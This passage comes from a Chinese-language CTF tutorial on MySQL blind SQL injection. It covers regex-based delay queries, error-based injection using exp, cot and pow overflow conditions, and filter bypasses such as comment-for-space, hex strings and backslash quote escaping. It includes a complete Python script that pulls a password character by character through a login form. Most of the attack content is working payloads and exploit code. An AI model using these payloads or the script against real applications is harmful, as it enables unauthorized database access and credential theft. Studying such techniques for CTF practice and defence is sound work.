**笛卡尔积**
也就是所谓的HEAVY QUERY，用的不多。
**get_lock**
可以精准控制延时时间，但是不好用，因为需要维持MySQL的会话，基本用不到。
**正则**
通过正则的状态机不断进行状态转换，增加比配的时长，打到延时的目的。例如：
    select rpad('a',4999999,'a') RLIKE concat(repeat('(a.*)+',30),'b');
###  写脚本的技巧
很多人喜欢这样写脚本：
    start_time = int(time.time())
    requests.get(url)
    end_time = int(time.time())
    if end_time - start_time > 3: # 用开始时间和结束时间做差
        print("延时发生了，注入成功")
这其实非常不好！因为我们发现了除了`sleep`其他基本都不太能精准控制延时时长，这样写脚本就是：你延时多久我就等你多久。太慢了！如果一次延时要一个小时，你也要等他一个小时吗？很明显不太明智，等你注完黄瓜菜都凉了。
正确的写延时盲注脚本的方法应该是：
    try:
        requests.get(url, timeout=3)
    except:
        print("延时发生了，注入成功")
我们利用`timeout=3`设置了一个3秒的超时，如果超时会抛出Exception。这样写代码的好处是：就算它要延时一年，我们也就等他3秒钟，然后就开始下一轮循环了，不用陪着MySQL延时，大大提高了脚本的效率。
## 0x06 报错盲注
###  报错盲注介绍
看这样一个题目的代码：
    $con = new mysqli($hostname,$username,$password,$database)
    $con->query("select username, password from users where username='$username' and password='$password'");
    if ($con->error) {
        die("ERROR")
    } else die("查询完成");
可以发现这是一个符合延时盲注条件的题目，因为题目没有根据查询结果的真假进行不同的布尔输出。但是题目同时ban掉了所有延时盲注所需的关键字，这时怎么办呢？
我们注意到，它会根据MySQL的query是否出错来选择是否输出ERROR，这其实就是布尔回显，因此报错盲注依然是布尔盲注的一种，但是他又和传统布尔盲注有显著的不同。
为了解决这个问题，如果我们能做到如下的操作就可以进行布尔盲注了：
    if( condition, 报错, 不报错)
    case when (condition) then 报错 else 不报错 end
问题就是，这个我们手工构造的报错应该如何来搞呢？
###  手工报错的方法
**exp(99999)**
`exp(x)`返回`e^x` 也就是e的x次方。所以`exp(x)`实际上就是f(x)=e^x^
既然是指数函数，增长率是很大的，那么就很容易变得很大，大到MySQL无法承受就报错了：
**cot(0)**
余切三角函数
**pow(99999,999999)**
和C语言一样，是用来求平方的，我们依然利用数太大导致报错这个思路：
###  优化
我们可以发现，报错盲注和延时盲注很像，延时盲注是“条件满足就sleep”，报错盲注是“条件满足就error”，那么如果`if`和`case`被ban了，如何进行报错盲注呢？
**exp**
我们发现`exp(1) exp(2)`这些是ok的，而`exp(9999)`就报错了，不免会问：`exp`的临界值是多少？是709
基于此我们可以让709加上一个condition，或者710减去一个condition。也可以利用`sleep()`用的乘法思想。
condition真则报错：
    exp((1=1)*9999)
    exp(709+(1=1))
condition假则报错：
    exp(710-(1=2))
**cot**
思路参考`exp`的，不详细说了。
condition真则报错
    cot(1-(1=1))
condition假则报错：
    cot(1=0) # 直接把条件放cot()函数里
**pow**
condition真则报错：
    pow(1+(1=1),99999)
condition假则报错：
    pow(2-(1=1),99999)
###  例题
在2021年11月左右的第四届“强网”拟态挑战赛的决赛中，有一道叫adminprofile的题目，大概是思路是：
  1. `INSERT()`截取+报错盲注，注出密码
  2. 登录，通过AJAX找接口，发现任意读
  3. 读源码，justSafeSet模块存在原型链污染漏洞
  4. AST Injection RCE
第一步的注入大概是过滤了`if case exp cot`和好多字符串截取和比较的关键字。注入的exp如下：
    #!/usr/bin/env python3
    #-*- coding:utf-8 -*-    #__author__: 颖奇L'Amore www.gem-love.com
    import requests as req 
    import time  
    url = 'http://ip:port/'
    s = req.session()
    def sqli():
        res = ''
        for i in range(0,20):
            for j in range(0, 100):
                j = 130-j
                data = {
                    'password' : f"'||pow((2-(ord(insert((insert(password,1,{i},'')),2,99999,''))-{j})),9999999999999)#"
                }
                r = req.post(url=url+'login', data=data)
                if 'error' not in r.text:
                    res += chr(j+1)
                    print(res)
                    break
                if j == 31:
                    print("注入完成, 密码是", res)
                    return res
    def login(password):
        data = {'password' : password}
        r = s.post(url=url+'login', data=data, allow_redirects=False)
        if str(r.status_code)[0] != '3':
            print("登录失败")
            exit(0)
        print("登录成功")
    if __name__ == '__main__':
        login(sqli())
题目没有复现环境，主要参考exp中所使用的payload，以及脚本的写法。
## 0x07 Bypass
上面其实已经讲了很多Bypass的方法，比如各种截取和比较的方法其实都是用来做bypass的，这里再简单总结一些其他的
###  空格
**行内注释（推荐）**
100%用来替代空格  
`select/*woshizhushi*/id/**/from/**/student;`
**换行符（推荐）**
`%0d%0a`也是不错的替代空格的方法。
**括号**
`select(id)from(student);`  
但是括号不能去括一些mysql自带的关键字，例如不能把`from`括起来，不作为首选的绕过方法。
**反引号**
对于表名和列名可以用反引号包裹起来。
    select`id`from`student`;
###  select关键字
**mysql8.0**
在MySQL 8.0版本中，`table student` 等价于 `select * from student;`
**在当前的表查其他字段**
在对当前表的列名注入时，可以直接写字段名，而无需`select 该字段 from 该表`
    select * from student where student_id = '2019122001' and ascii(substr(name,1,1))>0; # 这里name直接写，而不需要写成select name from student
###  单引号和字符串
**没有单引号就没有字符串，如何写字符串？**
1.字符串的十六进制形式
`'abc'` 等价于 `0x616263`
2\. `unhex()`与`hex()`连用
`'abc'` 等价于`unhex(hex(6e6+382179));` 可以用于绕过大数过滤（大数过滤：`/\d{9}|0x[0-9a-f]{9}/i`）
具体转换的步骤是：①`abc`转成16进制是`616263` ②`616263`转十进制是`6382179` ③用科学计数法表示`6e6+382179`
④套上`unhex(hex())`，就是`unhex(hex(6e6+382179));`
没有单引号没办法做SQL注入的参数逃逸
1\. 宽字节注入
2\. 转义法
条件是：用户可以控制一前一后两个参数  
方法是：前面的参数输入`\`转义掉单引号，后面参数逃逸出来  
例如：`select * from users where username = '\' and password = 'and 1=1#'`